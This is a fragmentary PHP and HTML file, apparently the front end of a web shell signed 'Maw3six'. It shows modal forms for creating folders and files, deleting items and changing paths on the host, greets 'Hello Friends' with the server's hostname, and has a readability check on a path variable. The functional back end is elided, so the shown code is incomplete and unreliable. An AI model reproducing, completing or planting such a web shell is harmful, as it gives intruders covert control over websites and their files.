...
<html>
    <head>
        ...
        <title>#Maw3six - <?= $_SERVER['HTTP_HOST']; ?></title>
        ...
        <div class="container-fluid py-3 p-5 mt-3">
                    ...
                    <form action="" method="post" class="modal-dialog">
                        <div class="modal-content">
                            ...
                            <div class="modal-body">
                                ...
                                <input type="email" class="form-control" name="ie" placeholder="How Are You?">
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">&#67;&#97;&#110;&#99;&#101;&#108;</button>
                                <button type="submit" class="btn btn-outline-dark btn-sm">&#83;&#117;&#98;&#109;&#105;&#116;</button>
                ...
                <div class="modal fade" id="aboutThis" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="aboutThisLabel" aria-hidden="true">
                    <form action="" method="post" class="modal-dialog">
                        <div class="modal-content">
                            ...
                            <div class="modal-body">
                                <center>
                                    <span>Hello Friends for <?= $_SERVER['HTTP_HOST']; ?> Made by Maw3six.</span>
                                </center>
                            </div>
                            <div class="modal-footer">
                    ...
                    <form action="" method="post" class="modal-dialog">
                        <div class="modal-content">
                            ...
                            <div class="modal-body">
                                ...
                                <input type="text" class="form-control" name="nfoln" placeholder="maw3six" required>
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">&#67;&#97;&#110;&#99;&#101;&#108;</button>
                    ...
                    <form action="" method="post" class="modal-dialog">
                        <div class="modal-content">
                            ...
                            <div class="modal-body">
                                ...
                                <input type="text" class="form-control" name="nn" placeholder="maw3six">
                    ...
                    <form action="" method="post" class="modal-dialog">
                        <div class="modal-content">
                            ...
                            <div class="modal-body">
                                ...
                                <input type="text" class="form-control" name="nd" placeholder="maw3six">
                    ...
                    <form action="" method="post" class="modal-dialog">
                        <div class="modal-content">
                            ...
                            <div class="modal-body">
                                ...
                                <input type="text" class="form-control" name="np" placeholder="maw3six">
            ...
            <?php
                if (!is_readable($cup)) {
                    ...
                    echo '<span>~ Hello Friends ~ ' . $_SERVER['HTTP_HOST'] . '</span>';
                    echo '</div>';
                    echo '</center>';
                    exit();
                }
            ...
            <center>
                ...
                ?>
                <hr width='20%'>
                <span>~ Hello Friends ~ <?= $_SERVER['HTTP_HOST']; ?></span>
            </center>
        </div>
